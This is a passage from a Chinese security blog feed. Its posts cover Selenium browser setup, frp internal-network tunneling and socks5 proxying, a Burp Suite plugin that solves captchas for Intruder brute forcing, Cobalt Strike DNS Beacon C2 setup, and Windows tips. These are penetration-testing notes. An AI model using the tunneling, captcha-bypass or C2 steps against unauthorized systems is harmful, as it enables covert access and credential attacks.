class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">初始化 Chrome 浏览器配置</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>chrome_options = webdriver.ChromeOptions()<br>chrome_options.add_argument(<span class="hljs-string">&quot;--incognito&quot;</span>)              <span class="hljs-comment"># 隐身模式</span><br><span class="hljs-comment"># chrome_options.add_argument(&#x27;--headless&#x27;)              # 无界面模式（取消注释即可开启）</span><br>chrome_options.add_argument(<span class="hljs-string">&quot;--disable-cache&quot;</span>)           <span class="hljs-comment"># 禁用缓存</span><br>chrome_options.add_argument(<span class="hljs-string">&quot;--disable-plugins&quot;</span>)         <span class="hljs-comment"># 禁用插件</span><br>chrome_options.add_argument(<span class="hljs-string">&quot;--disable-notifications&quot;</span>)   <span class="hljs-comment"># 禁用通知</span><br>chrome_options.add_argument(<span class="hljs-string">&quot;--disable-component-update&quot;</span>)<span class="hljs-comment"># 禁用组件更新</span><br>chrome_options.add_argument(<span class="hljs-string">&quot;--ignore-certificate-errors&quot;</span>) <span class="hljs-comment"># 忽略证书错误</span><br>chrome_options.add_experimental_option(<span class="hljs-string">&quot;useAutomationExtension&quot;</span>, <span class="hljs-literal">False</span>)  <span class="hljs-comment"># 禁用自动化扩展</span><br>chrome_options.add_experimental_option(<span class="hljs-string">&quot;excludeSwitches&quot;</span>, [<span class="hljs-string">&quot;enable-logging&quot;</span>])  <span class="hljs-comment"># 关闭日志</span><br><br>browser = webdriver.Chrome(options=chrome_options)<br>browser.maximize_window()<br>browser.implicitly_wait(<span class="hljs-number">5</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">初始化 Firefox 浏览器配置</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> selenium.webdriver.firefox.options <span class="hljs-keyword">import</span> Options<br><br>firefox_options = Options()<br><span class="hljs-comment"># firefox_options.add_argument(&quot;--private&quot;)               # 隐私模式</span><br>firefox_options.set_preference(<span class="hljs-string">&quot;app.update.auto&quot;</span>, <span class="hljs-literal">False</span>)  <span class="hljs-comment"># 禁用自动更新</span><br>firefox_options.set_preference(<span class="hljs-string">&quot;app.update.enabled&quot;</span>, <span class="hljs-literal">False</span>)<br>firefox_options.set_preference(<span class="hljs-string">&quot;browser.ssl_override_behavior&quot;</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># 忽略证书错误</span><br>firefox_options.set_preference(<span class="hljs-string">&quot;dom.webnotifications.enabled&quot;</span>, <span class="hljs-literal">False</span>) <span class="hljs-comment"># 禁用通知</span><br>firefox_options.set_preference(<span class="hljs-string">&quot;browser.dom.window.dump.enabled&quot;</span>, <span class="hljs-literal">False</span>) <span class="hljs-comment"># 禁用窗口日志</span><br>firefox_options.set_preference(<span class="hljs-string">&quot;browser.console.showInPanel&quot;</span>, <span class="hljs-literal">False</span>)   <span class="hljs-comment"># 禁用控制台日志</span><br>firefox_options.set_preference(<span class="hljs-string">&quot;toolkit.telemetry.reportingpolicy.firstRun&quot;</span>, <span class="hljs-literal">False</span>) <span class="hljs-comment"># 禁用首次运行报告</span><br><span class="hljs-comment"># firefox_options.headless = True                           # 无界面模式</span><br><br>browser = webdriver.Firefox(options=firefox_options)<br>browser.maximize_window()<br>browser.implicitly_wait(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><hr><p>如果你想快速上手浏览器自动化，Selenium 是非常实用的利器！💪<br>在日常任务、测试自动化、爬虫等场景都能派上用场~</p>]]></content>
    
    
    
    <tags>
      
      <tag>自动化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 frp 实现内网端口映射、转发</title>
    <link href="/2024/07/02/%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E3%80%81%E8%BD%AC%E5%8F%91/"/>
    <url>/2024/07/02/%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E3%80%81%E8%BD%AC%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议，且支持 P2P 通信。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p><p>下载地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><h3 id="🔐-1、frp-服务端配置"><a href="#🔐-1、frp-服务端配置" class="headerlink" title="🔐 1、frp 服务端配置"></a>🔐 1、frp 服务端配置</h3><blockquote><p>提示：在安全组策略放通对应的端口</p></blockquote><p>frp服务端配置文件：<code>frps.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 服务器(vps)配置</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">501</span><br><span class="hljs-attr">kcp_bind_port</span> = <span class="hljs-number">501</span><br><span class="hljs-attr">bind_udp_port</span> = <span class="hljs-number">502</span><br><span class="hljs-attr">vhost_http_port</span> = <span class="hljs-number">580</span><br><span class="hljs-attr">token</span> = <span class="hljs-number">123456</span><br><br><span class="hljs-comment"># 开启web控制面板</span><br><span class="hljs-attr">dashboard_port</span> = <span class="hljs-number">500</span><br><span class="hljs-attr">dashboard_user</span> = frp<br><span class="hljs-attr">dashboard_pwd</span> = <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>运行frps：<code>nohup ./frps -c ./frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</code></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240702152257070.png" alt="image-20240702152257070"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240702154405585.png" alt="image-20240702154405585"></p><h3 id="🔐-2、P2P-端口映射"><a href="#🔐-2、P2P-端口映射" class="headerlink" title="🔐 2、P2P 端口映射"></a>🔐 2、P2P 端口映射</h3><h4 id="🎯-主机A-被访问端"><a href="#🎯-主机A-被访问端" class="headerlink" title="🎯 主机A - 被访问端"></a>🎯 主机A - 被访问端</h4><p>修改配置文件：<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = vps ip<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">501</span><br><span class="hljs-attr">token</span> = <span class="hljs-number">123456</span><br><br><span class="hljs-comment"># 远程桌面端口</span><br><span class="hljs-section">[mstsc]</span><br><span class="hljs-attr">type</span> = stcp<br><span class="hljs-comment"># 只有 sk 一致的用户才能访问到此服务</span><br><span class="hljs-attr">sk</span> = <span class="hljs-number">123456</span><br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">3389</span><br><br><span class="hljs-comment"># vnc端口</span><br><span class="hljs-section">[vnc]</span><br><span class="hljs-attr">type</span> = stcp<br><span class="hljs-comment"># 设置密钥</span><br><span class="hljs-attr">sk</span> = <span class="hljs-number">123456</span><br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">5900</span><br><br><span class="hljs-comment"># awvs扫描器</span><br><span class="hljs-section">[awvs]</span><br><span class="hljs-attr">type</span> = stcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">13443</span><br><br><span class="hljs-comment"># socks5代理</span><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">510</span><br><span class="hljs-attr">plugin</span> = socks5<br><span class="hljs-attr">plugin_user</span> = root<br><span class="hljs-attr">plugin_passwd</span> = <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>运行：<code>frpc.exe -c frpc.ini</code></p><h4 id="🎯-主机B-访问端"><a href="#🎯-主机B-访问端" class="headerlink" title="🎯 主机B - 访问端"></a>🎯 主机B - 访问端</h4><p>修改配置文件：<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = vps ip<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">501</span><br><span class="hljs-attr">token</span> = <span class="hljs-number">123456</span><br><br><span class="hljs-comment"># 远程桌面端口</span><br><span class="hljs-section">[mstsc]</span><br><span class="hljs-comment"># 协议</span><br><span class="hljs-attr">type</span> = stcp<br><span class="hljs-comment"># 角色</span><br><span class="hljs-attr">role</span> = visitor<br><span class="hljs-comment"># 要访问的 stcp 代理的名字</span><br><span class="hljs-attr">server_name</span> = mstsc<br><span class="hljs-comment"># 访问者和被访问者的密钥相同</span><br><span class="hljs-attr">sk</span> = <span class="hljs-number">123456</span><br><span class="hljs-comment"># 绑定本地地址和端口</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">3390</span><br><br><br><span class="hljs-comment"># vnc远程端口</span><br><span class="hljs-section">[vnc]</span><br><span class="hljs-attr">type</span> = stcp<br><span class="hljs-attr">role</span> = visitor<br><span class="hljs-attr">server_name</span> = vnc<br><span class="hljs-attr">sk</span> = <span class="hljs-number">123456</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">5900</span><br><br><span class="hljs-comment"># awvs扫描器</span><br><span class="hljs-section">[awvs]</span><br><span class="hljs-attr">type</span> = stcp<br><span class="hljs-attr">role</span> = visitor<br><span class="hljs-attr">server_name</span> = awvs<br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">13443</span><br></code></pre></td></tr></table></figure><p>运行：<code>frpc.exe -c frpc.ini</code></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240702152527573.png" alt="image-20240702152527573"></p><h4 id="🎯-主机B-远程桌面-主机A"><a href="#🎯-主机B-远程桌面-主机A" class="headerlink" title="🎯 主机B 远程桌面 主机A"></a>🎯 主机B 远程桌面 主机A</h4><ol><li>运行：<code>frpc.exe -c frpc.ini</code></li><li>主机B<code>3390</code>端口 绑定 主机A<code>3389</code>端口</li><li>远程桌面地址：<code>127.0.0.1:3390</code></li></ol><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240702152928485.png" alt="image-20240702152928485"></p><h3 id="📌-3、搭建-socks5-隧道"><a href="#📌-3、搭建-socks5-隧道" class="headerlink" title="📌 3、搭建 socks5 隧道"></a>📌 3、搭建 socks5 隧道</h3><ol><li>修改客户端配置文件：<code>frpc.ini</code>，使用代理后，流量通过客户端的网络进行访问。</li><li>代理地址：<code>socks5://vps_ip:510</code></li><li>认证信息：<code>root/123456</code></li></ol><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = vps ip<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">501</span><br><span class="hljs-attr">token</span> = <span class="hljs-number">123456</span><br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">510</span><br><span class="hljs-attr">plugin</span> = socks5<br><span class="hljs-attr">plugin_user</span> = root<br><span class="hljs-attr">plugin_passwd</span> = <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>运行：<code>frpc.exe -c frpc.ini</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>隧道代理</tag>
      
      <tag>端口转发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个自动识别验证码的 burp 插件</title>
    <link href="/2024/07/02/%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%20burp%20%E6%8F%92%E4%BB%B6/"/>
    <url>/2024/07/02/%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%20burp%20%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>🎯 本文介绍如何使用 burp 插件配合 <a href="https://github.com/sml2h3/ddddocr">ddddocr</a> 实现自动验证码识别，支持新版 Burp Suite，提升渗透测试效率。</p><hr><h3 id="🔗-插件下载"><a href="#🔗-插件下载" class="headerlink" title="🔗 插件下载"></a>🔗 插件下载</h3><p><a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></p><hr><h3 id="1、Burp-插件配置"><a href="#1、Burp-插件配置" class="headerlink" title="1、Burp 插件配置"></a>1、Burp 插件配置</h3><p>在 Burp Suite 中导入插件后，打开插件面板，进行相应配置：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704508608454-ce7c17f2-3399-4696-b329-678e043ccf2c.png" alt="img"></p><hr><h3 id="2、本地启动验证码识别服务"><a href="#2、本地启动验证码识别服务" class="headerlink" title="2、本地启动验证码识别服务"></a>2、本地启动验证码识别服务</h3><p>执行以下命令启动本地 OCR 服务，默认监听端口 9898：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python ocr_server.py --port 9898 --ocr<br></code></pre></td></tr></table></figure><p>启动成功界面：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240702101657734.png" alt="image-20240702101657734"></p><hr><h3 id="3、插件请求配置"><a href="#3、插件请求配置" class="headerlink" title="3、插件请求配置"></a>3、插件请求配置</h3><p>右键发送验证码请求包到插件，填写验证码识别接口地址：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1:9898</span><br></code></pre></td></tr></table></figure><hr><h3 id="4、请求包示例"><a href="#4、请求包示例" class="headerlink" title="4、请求包示例"></a>4、请求包示例</h3><p>插件发送的请求示例如下，使用 POST 方法，内容包含 Base64 编码的图片数据：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ocr/b64/text</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:9898<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55<br><br><span class="language-apache"><span class="hljs-section">&lt;@BASE64&gt;</span><span class="hljs-section">&lt;@IMG_RAW&gt;</span><span class="hljs-section">&lt;/@IMG_RAW&gt;</span><span class="hljs-section">&lt;/@BASE64&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h3 id="5、在-Intruder-模块中调用"><a href="#5、在-Intruder-模块中调用" class="headerlink" title="5、在 Intruder 模块中调用"></a>5、在 Intruder 模块中调用</h3><p>将验证码识别插件集成到 Burp Intruder，自动识别并填充验证码，提升批量测试效率。</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704515183908-f86a9e55-8602-4059-a8fe-74fb8de7a2f0.gif" alt="img"></p><hr><p>✨ 这样一来，Burp Suite 就能智能自动识别验证码，大大降低了手动输入验证码的繁琐工作，提升渗透测试效率。祝你使用愉快！🚀</p>]]></content>
    
    
    
    <tags>
      
      <tag>burp</tag>
      
      <tag>验证码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cobalt strike配置DNS Beacon</title>
    <link href="/2024/07/02/cobalt%20strike%E9%85%8D%E7%BD%AEDNS%20Beacon/"/>
    <url>/2024/07/02/cobalt%20strike%E9%85%8D%E7%BD%AEDNS%20Beacon/</url>
    
    <content type="html"><![CDATA[<h4 id="1、域名配置"><a href="#1、域名配置" class="headerlink" title="1、域名配置"></a>1、域名配置</h4><p>域名解析添加2条A记录指向VPS地址，添加NS记录指向A记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 2条A记录指向CS的IP地址</span><br>ns1.xxx.com =&gt; VPS IP<br>ns2.xxx.com =&gt; VPS IP<br><span class="hljs-comment"># 2条NS记录指向A记录</span><br>answers.xxx.com =&gt; ns1.xxx.com<br>answers.xxx.com =&gt; ns2.xxx.com<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250711110912230.png" alt="image-20250711110912230"></p><h4 id="2、CS-Listener-配置"><a href="#2、CS-Listener-配置" class="headerlink" title="2、CS Listener 配置"></a>2、CS Listener 配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: Beacon DNS<br>DNS Hosts: answers.xxx.com<br>DNS Hosts(Stager): answers.xxx.com<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250711111005572.png" alt="image-20250711111005572"></p><h4 id="3、成功上线"><a href="#3、成功上线" class="headerlink" title="3、成功上线"></a>3、成功上线</h4><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250711111111167.png" alt="image-20250711111111167"></p>]]></content>
    
    
    
    <tags>
      
      <tag>cobalt strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows系统异常问题的解决方案</title>
    <link href="/2024/07/02/Windows%E7%B3%BB%E7%BB%9F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2024/07/02/Windows%E7%B3%BB%E7%BB%9F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<h3 id="📌-Windows桌面文件-不能拖动"><a href="#📌-Windows桌面文件-不能拖动" class="headerlink" title="📌 Windows桌面文件&#x2F;不能拖动"></a>📌 Windows桌面文件&#x2F;不能拖动</h3><p><strong>解决方案：</strong></p><p>长按键盘左上角的 <strong>Esc</strong> 键几秒后松开即可恢复正常。</p><hr><h3 id="📌-Windows系统“桌面”变成“Desktop”"><a href="#📌-Windows系统“桌面”变成“Desktop”" class="headerlink" title="📌 Windows系统“桌面”变成“Desktop”"></a>📌 Windows系统“桌面”变成“Desktop”</h3><p><strong>解决方案：</strong></p><p>检查桌面目录下的 <code>desktop.ini</code> 文件，写入以下内容，然后重启资源管理器或重启电脑。</p><p>如果没有该文件，可以新建一个：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[.ShellClassInfo]</span><br><span class="hljs-attr">LocalizedResourceName</span>=@%SystemRoot%\system32\shell32.dll,-<span class="hljs-number">21769</span><br><span class="hljs-attr">IconResource</span>=%SystemRoot%\system32\imageres.dll,-<span class="hljs-number">183</span><br></code></pre></td></tr></table></figure><hr><h3 id="📌-Windows桌面文件删除后需要刷新才消失"><a href="#📌-Windows桌面文件删除后需要刷新才消失" class="headerlink" title="📌 Windows桌面文件删除后需要刷新才消失"></a>📌 Windows桌面文件删除后需要刷新才消失</h3><p><strong>解决方案：</strong></p><p>重启资源管理器进程 <code>explorer.exe</code> 即可。</p><hr><h3 id="📌-Windows桌面图标间距异常"><a href="#📌-Windows桌面图标间距异常" class="headerlink" title="📌 Windows桌面图标间距异常"></a>📌 Windows桌面图标间距异常</h3><p><strong>解决方案：</strong></p><p>注册表位置：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">计算机<span class="hljs-string">\HKEY_CURRENT_USER\Control</span> Panel<span class="hljs-string">\Desktop\WindowMetrics</span><br></code></pre></td></tr></table></figure><p>修改以下两个键值，默认值均为 <code>-1125</code>：</p><ul><li><code>IconSpacing</code>：控制图标之间的水平间距</li><li><code>IconVerticalSpacing</code>：控制图标之间的垂直间距</li></ul><p>根据喜好调整数值，间距越大数值越小（负数更大绝对值）。</p><hr><h3 id="📌-如何禁止-F1-键自动弹出浏览器"><a href="#📌-如何禁止-F1-键自动弹出浏览器" class="headerlink" title="📌 如何禁止 F1 键自动弹出浏览器"></a>📌 如何禁止 F1 键自动弹出浏览器</h3><p>F1 是 Windows 10 默认的帮助键，按下时会启动 Edge 浏览器显示帮助内容，影响使用。</p><p><strong>解决方案：</strong></p><p>创建以下脚本保存为 <code>.bat</code> 文件（如 <code>stopF1.bat</code>），右键以管理员身份运行即可：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">taskkill</span> /f /im HelpPane.exe<br>takeown /f <span class="hljs-variable">%WinDir%</span>\HelpPane.exe<br>icacls <span class="hljs-variable">%WinDir%</span>\HelpPane.exe /deny Everyone:(X)<br></code></pre></td></tr></table></figure><hr><h3 id="📌-如何保存-Win10-锁屏界面的壁纸"><a href="#📌-如何保存-Win10-锁屏界面的壁纸" class="headerlink" title="📌 如何保存 Win10 锁屏界面的壁纸"></a>📌 如何保存 Win10 锁屏界面的壁纸</h3><p>壁纸路径：</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">localappdata</span></span>%\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets<br></code></pre></td></tr></table></figure><p>将文件复制出来，重命名后缀为 <code>.jpg</code> 即可查看。</p><hr><h3 id="📌-浏览器访问异常提示“HSTS”问题"><a href="#📌-浏览器访问异常提示“HSTS”问题" class="headerlink" title="📌 浏览器访问异常提示“HSTS”问题"></a>📌 浏览器访问异常提示“HSTS”问题</h3><p>访问某些网站时出现：</p><blockquote><p>您目前无法访问 因为此网站使用了 HSTS。网络错误和攻击通常是暂时的，因此，此网页稍后可能会恢复正常。</p></blockquote><p><strong>解决方案：</strong></p><p>在浏览器页面，直接键盘输入：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">thisisunsafe</span><br></code></pre></td></tr></table></figure><p>网页会自动刷新并允许访问。</p><hr><h3 id="📌-Windows调整桌面右键菜单“新建”选项顺序"><a href="#📌-Windows调整桌面右键菜单“新建”选项顺序" class="headerlink" title="📌 Windows调整桌面右键菜单“新建”选项顺序"></a>📌 Windows调整桌面右键菜单“新建”选项顺序</h3><p><strong>解决方案：</strong></p><p>注册表路径：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew<br></code></pre></td></tr></table></figure><p>修改 <code>Classes</code> 键值，按想要的顺序排列菜单项。</p><p>示例：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1716858747861-d133d7f7-bf75-48e2-a49f-177a36022aef.png" alt="菜单顺序示例1"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1716858706450-88ba7023-51e2-44c3-bf65-fd91ee9f71ac.png" alt="菜单顺序示例2"></p>]]></content>
    
    
    
    <tags>
      
      <tag>系统异常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 lcx、portmap 实现内网端口转发</title>
    <link href="/2024/07/01/%E4%BD%BF%E7%94%A8%20lcx%E3%80%81portmap%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <url>/2024/07/01/%E4%BD%BF%E7%94%A8%20lcx%E3%80%81portmap%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    
